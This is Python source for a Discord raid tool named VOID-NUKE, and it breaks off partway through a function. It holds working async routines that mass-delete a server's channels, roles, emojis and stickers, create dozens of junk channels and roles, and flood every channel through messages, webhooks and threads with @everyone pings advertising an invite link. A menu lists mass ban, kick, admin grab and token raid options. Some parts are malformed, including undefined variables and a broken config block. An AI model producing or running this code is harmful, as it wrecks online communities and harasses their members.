# ══════════════════════════════════════════════════════
#  VOID-NUKE  v1.0.0  --  by void
#  t.me/v0idtool · discord.gg/voidv2  |  github.com/v0id4real
# ══════════════════════════════════════════════════════

import os, sys, time, random, asyncio, json, re, webbrowser
import urllib.request
import aiohttp
from datetime    import datetime, timezone, timedelta
from shutil      import get_terminal_size
from colorama    import init

import discord
from discord.ext import commands
from discord     import Activity, ActivityType

init(autoreset=True)

NO_BAN_KICK_ID = []

DISCORD_URL  = "https://discord.gg/jfFHjdhjR"
DISCORD_TAG  = "https://discord.gg/jfFHjdhjR"
PUB          = f"||@everyone||  **garaputa kayo ih**  :   · {DISCORD_TAG}  "
PUB_SHORT    = f"{DISCORD_TAG}"
RAID_NAME   = "kantot de kalimot"
TOOL_NAME   = "VOID-NUKE"

AUTO_RAID_CONFIG = {
    "channel_type"   : "text",
    "channel_name"   : RAID_NAME,
    "num_channels"   : 50,
    "num_messages"   : 10,
    "message_content": PUB,
}

EMBED_CONFIG = {
    "title"      : "\U0001f480  __VOID-NUKE__",
    "description": (
        "**Ton serveur vient d'\u00eatre raid par VOID-NUKE.**\n\n"
        "_ _\n"
        
    f"**> {DISCORD_TAG}**\n"

     "_ _\n"
        "||@everyone||"
    ),
    "color"      : 0xFF0000,
    "message"    : f"||@everyone||  {PUB}",
    "image"      : "https://media.discordapp.net/attachments/1471977538648674478/1477637266791727155/c51ca65be8fa86b4b8f29a7d15dce335_1.webp",
    "footer"     : f"{DISCORD_TAG}",
    "fields"    
        
        {"name": "\U0001f517 __Discord__", "value": f"**{DISCORD_TAG}**", "inline": True},
        {"
    ],
}

WEBHOOK_CONFIG = {"default_name": "VOID-NUKE"}
SERVER_CONFIG  = {
    "new_name"       : "burat",
    "new_icon"       : "",
    "new_description": f"{DISCORD_TAG}",
}
BOT_PRESENCE = {"type": "playing", "text": f"{TELEGRAM_TAG} · {DISCORD_TAG}"}

# ── palette ────────────────────────────────────────────
RS  = "\033[0m";  B   = "\033[1m"
R1  = "\033[38;5;196m";  R2  = "\033[38;5;160m";  R3  = "\033[38;5;124m"
DIM = "\033[38;5;240m";  D2  = "\033[38;5;235m";  WHT = "\033[38;5;252m"

def r1(t):  return f"{R1}{B}{t}{RS}"
def r2(t):  return f"{R2}{t}{RS}"
def r3(t):  return f"{R3}{t}{RS}"
def dim(t): return f"{DIM}{t}{RS}"
def wht(t): return f"{WHT}{B}{t}{RS}"

def _TW():   return min(get_terminal_size((100,30)).columns, 110)
def _clr():  os.system('cls' if os.name == 'nt' else 'clear')
def _vis(s): return re.sub(r'\033\[[^m]*m','',s)
def _vl(s):  return len(_vis(s))

# ── fx ─────────────────────────────────────────────────
def fx_glitch(text: str, n=5):
    gc = "!@#$%^&*?+"
    for i in range(n):
        g = "".join(random.choice(gc) if random.random()<.18 else c for c in text)
        col = R1 if i%2 else R3
        sys.stdout.write(f"\r  {col}{B}{g}{RS}"); sys.stdout.flush(); time.sleep(.05)
        sys.stdout.write(f"\r{' '*(_vl(text)+6)}"); sys.stdout.flush(); time.sleep(.025)
    sys.stdout.write(f"\r  {R1}{B}{text}{RS}\n"); sys.stdout.flush()

def fx_load(label: str, w=26, delay=.018):
    print()
    for i in range(w+1):
        pct  = int(i/w*100)
        done = f"{R2}{'|'*i}{RS}"; rest = f"{D2}{'.'*(w-i)}{RS}"
        sys.stdout.write(f"\r  {DIM}::{RS} {wht(label)}  {D2}[{RS}{done}{rest}{D2}]{RS}  {DIM}{pct:3d}%{RS}")
        sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(f"\r  {R1}{B}::{RS} {wht(label)}  {D2}[{RS}{R1}{B}{'|'*w}{RS}{D2}]{RS}  {R1}{B}done{RS}\n\n")
    sys.stdout.flush()

def fx_spin(label: str, dur=.9):
    fr, end, i = r"|/-\\", time.time()+dur, 0
    while time.time() < end:
        sys.stdout.write(f"\r  {R2}{fr[i%4]}{RS}  {wht(label)}")
        sys.stdout.flush(); time.sleep(.08); i += 1
    sys.stdout.write(f"\r  {R1}{B}+{RS}  {wht(label)}\n")

# ── logger ─────────────────────────────────────────────
_LOGS: list[str] = []

def _ts():  return f"{D2}[{DIM}{datetime.now().strftime('%H:%M:%S')}{D2}]{RS}"
def _log(p, m):
    print(f"  {_ts()} {p} {WHT}{m}{RS}")
    _LOGS.append(f"[{datetime.now().strftime('%H:%M:%S')}] {_vis(m)}")

def log_ok  (m): _log(f"{R1}{B}[+]{RS}", m)
def log_err (m): _log(f"{R3}{B}[-]{RS}", m)
def log_warn(m): _log(f"{R2}{B}[!]{RS}", m)
def log_info(m): _log(f"{DIM}[*]{RS}",   m)

def _ask(prompt: str) -> str:
    return input(f"\n  {R1}{B}>>{RS} {wht(prompt)} {D2}:{RS} ").strip()

def _confirm(p: str) -> bool:
    return input(f"\n  {R2}[?]{RS} {wht(p)} {DIM}[yes/no]{RS} {D2}:{RS} ").strip().lower() == "yes"

def _section(title: str):
    w = 62
    print(f"\n  {D2}{'─'*w}{RS}")
    print(f"  {R1}{B}  {title}{RS}")
    print(f"  {D2}{'─'*w}{RS}\n")

def _star_image_path():
    base = os.path.dirname(os.path.abspath(__file__))
    for name in ("star.PNG", "Star.png", "star.png", "Star.PNG"):
        path = os.path.join(base, name)
        if os.path.exists(path):
            return path
    return os.path.join(base, "Star.png")

def _open_community_links():
    for url in (TELEGRAM_URL, DISCORD_URL):
        try:
            webbrowser.open(url)
            time.sleep(.4)
        except Exception:
            pass

def _open_star_unlock():
    _section("STAR FOR UNLOCK")
    log_warn("star the repo to unlock premium features !")
    log_info("github.com/v0id4real/Void-Nuke")
    try:
        _open_community_links()
        time.sleep(.4)
        webbrowser.open(GITHUB_URL)
        time.sleep(.4)
        star = _star_image_path()
        if os.path.exists(star):
            if os.name == "nt":
                os.startfile(star)
            else:
                webbrowser.open(star)
    except Exception:
        pass

def _summary(action: str, ok: int, fail: int, t: float):
    print(f"\n  {D2}{'─'*40}{RS}")
    print(f"  {DIM}action{RS}  {wht(action)}")
    print(f"  {R1}{B}[+]{RS} {R2}{ok} ok{RS}   {R3}[-]{RS} {DIM}{fail} err{RS}   {DIM}{t:.2f}s{RS}")
    print(f"  {D2}{'─'*40}{RS}\n")

def _get_guild(sid: str):
    g = bot.get_guild(int(sid))
    if not g: log_err("guild not found")
    return g

# ── banner ─────────────────────────────────────────────
_ART = [
    r"██╗   ██╗ ██████╗ ██╗██████╗ ",
    r"██║   ██║██╔═══██╗██║██╔══██╗",
    r"██║   ██║██║   ██║██║██║  ██║",
    r"╚██╗ ██╔╝██║   ██║██║██║  ██║",
    r" ╚████╔╝ ╚██████╔╝██║██████╔╝",
    r"  ╚═══╝   ╚═════╝ ╚═╝╚═════╝ ",
]
_ART2 = [
    r"  ██╗    ██╗██╗   ██╗██╗  ██╗███████╗ ║               ",
    r"  ████╗  ██║██║   ██║██║ ██╔╝██╔════╝ ║ by 1s0e       ",
    r"  ██╔██╗ ██║██║   ██║█████╔╝ █████╗   ╠══════════════ ",
    r"  ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝   ║ " + DISCORD_TAG + "  ",
    r"  ██║ ╚████║╚██████╔╝██║  ██╗███████╗ ╠══════════════ ",
    r"  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ║               ",
]
_SHADES = [R1, R1, R2, R2, R3, R3]

def _print_banner(bot_n="", srv_n="", members=0, animated=False):
    print()
    for i, (l, r) in enumerate(zip(_ART, _ART2)):
        c = _SHADES[i]
        print(f"{c}{B}{l}  {r}{RS}")
        if animated: time.sleep(.035)
    print()
    if bot_n:
        info = f"  {DIM}bot{RS} {r1(bot_n)}  {D2}|{RS}  {DIM}server{RS} {wht(srv_n or '-')}  {D2}|{RS}  {DIM}members{RS} {r1(str(members))}"
        bw   = _vl(info) + 2
        print(f"  {D2}{'─'*bw}{RS}")
        print(info)
        print(f"  {D2}{'─'*bw}{RS}")
        print()

# ── menu  (40 options — page 2 : option 39 = DM Spam User, 40 = Quit) ─────
_MENU = [
    [   # ── page 1 ─────────────────────────────────────────────────────
        [("01","Nuke"),  ("02","Auto Raid"),  ("03","Ban All"),  ("04","Kick All")],
        [("05","Mute All"),  ("06","Unban All"),  ("07","Del Channels"),  ("08","Del Emojis")],
        [("09","Del Stickers"),  ("10","Create Channels"),  ("11","Create Roles"),  ("12","Create Cats")],
        [("13","Rename Channels"),  ("14","Rename Roles"),  ("15","Edit Server"),  ("16","Rename Members")],
        [("17","Fix Nicks"),  ("18","Get Admin"),  ("19","Impersonate"),  ("20","Ghost Ping")],
    ],
    [   # ── page 2 ─────────────────────────────────────────────────────
        [("21","Remov Roles"),  ("22","Message All"),  ("23","DM Spam User"),  ("24","Webhook Spam")],
        [("25","Server Info"),  ("26","Clone Server"),  ("27","Webhook Logs"),  ("28","Lockdown")],
        [("29","Sourdine VC"),  ("30","Kick VC All"),  ("31","Move All VC"),  ("32","Invite Spam")],
        [("33","Spam"),  ("34","Thread Spam"),  ("35","Reaction Spam"),  ("36","Voice Spam")],
        [("37","Spoiler Spam"),  ("38","Poll Spam"),  ("39","Event Spam"),  ("40","Quit")],
    ],
    [   # ── page 3 — Star-for-unlock (41-45) ───────────────────────────
        [("41","Ultra Nuke Pro"),  ("42","Auto Destroy V2"),  ("43","Token Raid"),  ("44","Server Cloner+")],
        [("45","Webhook Nuke Pro"),  None,  None,  None],
    ],
]

_CW = 24

def _cell(num, label) -> str:
    tag = f"{R2}«{num}»{RS}"; lbl = f"{WHT}{label}{RS}"
    raw = f"{tag} {lbl}"; pad = max(0, _CW - _vl(raw))
    return raw + " " * pad

def _border(lc, mc, rc, fill="─"):
    seg   = fill * (_CW + 2)
    inner = (f"{D2}{mc}{RS}" + f"{D2}{seg}{RS}") * 3
    return f"  {D2}{lc}{RS}{D2}{seg}{RS}{inner}{D2}{rc}{RS}"

def _row_line(cells):
    out = []
    for item in cells:
        if item is None: out.append(" " + " " * _CW + " ")
        else:
            n, l = item; out.append(f" {_cell(n, l)} ")
    return f"  {D2}|{RS}" + f"{D2}|{RS}".join(out) + f"{D2}|{RS}"

def _print_menu(page: int = 1):
    rows = _MENU[page-1]
    print(_border("┌","┬","┐"))
    for i, row in enumerate(rows):
        print(_row_line(row))
        if i < len(rows)-1: print(_border("├","┼","┤"))
    print(_border("└","┴","┘"))
    prev = r1("«b»") if page > 1 else dim("   ")
    nxt  = r1("«n»") if page < 3 else dim("   ")
    print(f"\n  {prev} {dim('prev')}    {dim(f'page {page}/3')}    {nxt} {dim('next')}    {dim('«q» quit')}")
    print(f"\n  {R3}VOID-NUKE v1.0.0{RS}  {DIM}Discord : 1s0e{RS}")
    print(f"\n  {R1}{B}[Option]{RS} {D2}>>{RS} ", end="", flush=True)

# ── helpers ────────────────────────────────────────────
def _pub_append(content: str) -> str:
    if TELEGRAM_TAG in content or DISCORD_TAG in content or TELEGRAM_URL in content or DISCORD_URL in content: return content
    return f"{content}\n{PUB}"

async def delete_channel(c) -> bool:
    try:
        await c.delete(); log_ok(f"#{c.name}"); return True
    except discord.Forbidden:          log_err(f"no perm #{c.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} #{c.name}")
    return False

async def delete_role(r) -> bool:
    if r.is_default(): return False
    try:
        await r.delete(); log_ok(f"@{r.name}"); return True
    except discord.Forbidden:          log_err(f"no perm @{r.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} @{r.name}")
    return False

async def create_channel(guild, typ, name):
    try:
        c = (await guild.create_text_channel(name) if typ == 'text' else await guild.create_voice_channel(name))
        log_ok(f"#{c.name}"); return c
    except discord.Forbidden:          log_err(f"no perm create {typ}")
    except discord.HTTPException as e: log_err(f"http{e.status}")
    return None

async def _send_embed(target, everyone=False):
    try:
        cfg = EMBED_CONFIG
        e   = discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
        for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
        if cfg["image"]: e.set_image(url=cfg["image"])
        e.set_footer(text=cfg["footer"])
        c = f"@everyone {cfg['message']}" if everyone else cfg['message']
        await target.send(content=c, embed=e)
        log_ok(f"embed -> {getattr(target,'name',str(target))}")
    except Exception as ex: log_err(_vis(str(ex)))

async def _send_to(chan, count, content, everyone):
    final = _pub_append(content)
    try:
        for i in range(count):
            if content.lower() == 'embed': await _send_embed(chan, everyone)
            else: await chan.send(final)
            log_ok(f"[{i+1}/{count}] #{chan.name}")
    except discord.Forbidden:          log_err(f"no perm #{chan.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} #{chan.name}")

def _skip(m, bot_id):
    if m.id == bot_id: return True
    if m.id in NO_BAN_KICK_ID: log_warn(f"skip {m.name}"); return True
    return False

# ══════════════════════════════════════════════════════
#  COMMANDS
# ══════════════════════════════════════════════════════

async def nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("NUKE")
    log_warn(f"{g.name}  {dim(f'{len(g.channels)}ch / {len(g.roles)}roles')}")
    if not _confirm(f"full nuke {g.name}"): return log_info("canceled")
    t = time.perf_counter()
    fx_load("wipe channels & roles", 26, .012)
    cr, rr = await asyncio.gather(
        asyncio.gather(*[delete_channel(c) for c in list(g.channels)]),
        asyncio.gather(*[delete_role(r)    for r in list(g.roles)]),
    )
    log_ok(f"wiped  {cr.count(True)} channels  {rr.count(True)} roles")
    fx_load("create 50 channels", 22, .014)
    created = await asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(50)], return_exceptions=True)
    new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
    log_ok(f"{len(new_chans)} channels ready")
    fx_load("create 50 roles", 22, .014)
    async def _make_role():
        try:
            col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
            await g.create_role(name="VOID-NUKE", colour=col); return True
        except: return False
    rr2 = await asyncio.gather(*[_make_role() for _ in range(50)])
    log_ok(f"{rr2.count(True)} roles VOID-NUKE created")
    fx_load("webhook spam", 22, .014)
    async def _raid_chan(chan):
        try:
            wh = await chan.create_webhook(name="VOID-NUKE TOOLS")
            for _ in range(5):
                try: await wh.send(content=PUB, username="VOID-NUKE TOOLS")
                except: pass
            try: await wh.delete()
            except: pass
            log_ok(f"spammed #{chan.name}")
        except Exception as e: log_err(f"#{chan.name}  {_vis(str(e))}")
    await asyncio.gather(*[_raid_chan(c) for c in new_chans])
    fx_glitch(f"NUKE COMPLETE  |  {g.name}")
    _summary("Nuke", len(new_chans), 50-len(new_chans), time.perf_counter()-t)

async def auto_raid(sid):
    g = _get_guild(sid)
    if not g: return
    _section("AUTO RAID"); log_warn(f"target  {g.name}")
    fx_load("initializing", 28, .012)
    t = time.perf_counter()
    ch = await asyncio.gather(*[delete_channel(c) for c in list(g.channels)])
    cr = await asyncio.gather(*[create_channel(g, AUTO_RAID_CONFIG['channel_type'], AUTO_RAID_CONFIG['channel_name']) for _ in range(AUTO_RAID_CONFIG['num_channels'])])
    async def _role():
        try:
            col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
            await g.create_role(name="VOID-NUKE", colour=col); return True
        except: return False
    await asyncio.gather(*[_role() for _ in range(50)])
    log_ok("50 roles VOID-NUKE created")
    await asyncio.gather(*[_send_to(c, AUTO_RAID_CONFIG['num_messages'], AUTO_RAID_CONFIG['message_content'], False) for c in g.channels if isinstance(c, discord.TextChannel)])
    fx_glitch(f"RAID DONE  |  {g.name}")
    _summary("Auto Raid", ch.count(True)+sum(r is not None for r in cr), ch.count(False)+sum(r is None for r in cr), time.perf_counter()-t)

async def delete_emojis(sid):
    g = _get_guild(sid)
    if not g: return
    emojis = list(g.emojis)
    if not emojis: return log_info("no emojis")
    _section("DEL EMOJIS"); fx_load("wiping", 18, .018)
    t = time.perf_counter()
    async def _d(e):
        try: await e.delete(); log_ok(f":{e.name}:"); return True
        except: return False
    r = await asyncio.gather(*[_d(e) for e in emojis])
    _summary("Del Emojis", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_stickers(sid):
    g = _get_guild(sid)
    if not g: return
    st = list(g.stickers)
    if not st: return log_info("no stickers")
    _section("DEL STICKERS"); fx_load("wiping", 16, .018)
    t = time.perf_counter()
    async def _d(s):
        try: await s.delete(); log_ok(s.name); return True
        except: return False
    r = await asyncio.gather(*[_d(s) for s in st])
    _summary("Del Stickers", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DELETE CHANNELS")
    log_warn(f"{g.name}  {dim(f'{len(g.channels)} channels')}")
    if not _confirm(f"delete all channels {g.name}"): return log_info("canceled")
    fx_load("deleting all channels", 26, .014)
    t = time.perf_counter()
    r = await asyncio.gather(*[delete_channel(c) for c in list(g.channels)])
    fx_glitch(f"ALL CHANNELS DELETED  |  {g.name}")
    _summary("Delete Channels", r.count(True), r.count(False), time.perf_counter()-t)

async def spam_channel(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM")
    try: count = int(_ask("messages per channel"))
    except ValueError: return log_err("invalid")
    content  = _ask("content  [enter = pub  |  'embed' = embed]") or PUB
    everyone = False
    if content.lower() == 'embed': everyone = _ask("@everyone? [yes/no]").lower() == 'yes'
    fx_load("charging", 18, .018)
    t  = time.perf_counter()
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    await asyncio.gather(*[_send_to(c, count, content, everyone) for c in tc])
    _summary("Spam", count*len(tc), 0, time.perf_counter()-t)

async def _send_wh(wh, count, content, everyone):
    final = _pub_append(content)
    try:
        for _ in range(count):
            if content.lower() == 'embed': await _send_embed(wh, everyone)
            else: await wh.send(content=final)
            log_ok(f"wh {wh.name}")
    except Exception as e: log_err(_vis(str(e)))

async def webhook_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("WEBHOOK SPAM")
    try: count = int(_ask("messages per webhook"))
    except ValueError: return log_err("invalid")
    content  = _ask("content  [enter = pub  |  'embed' = embed]") or PUB
    everyone = False
    if content.lower() == 'embed': everyone = _ask("@everyone? [yes/no]").lower() == 'yes'
    fx_load("spawning webhooks", 20, .018)
    t   = time.perf_counter()
    whs = await asyncio.gather(*[c.create_webhook(name=WEBHOOK_CONFIG["default_name"]) for c in g.channels if isinstance(c, discord.TextChannel)], return_exceptions=True)
    whs = [w for w in whs if isinstance(w, discord.Webhook)]
    log_info(f"{len(whs)} webhooks")
    await asyncio.gather(*[_send_wh(wh, count, content, everyone) for wh in whs])
    _summary("Webhook Spam", len(whs)*count, 0, time.perf_counter()-t)

async def thread_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("THREAD SPAM")
    try: count = int(_ask("threads per channel"))
    except ValueError: return log_err("invalid")
    name = _ask("thread name  [enter = pub]") or f"VOID-NUKE | {DISCORD_TAG}"
    fx_load("spawning", 18, .018)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                m = await chan.send(PUB); await m.create_thread(name=f"{name} {i+1}")
                log_ok(f"#{chan.name} [{i+1}]"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Thread Spam", ok, fail, time.perf
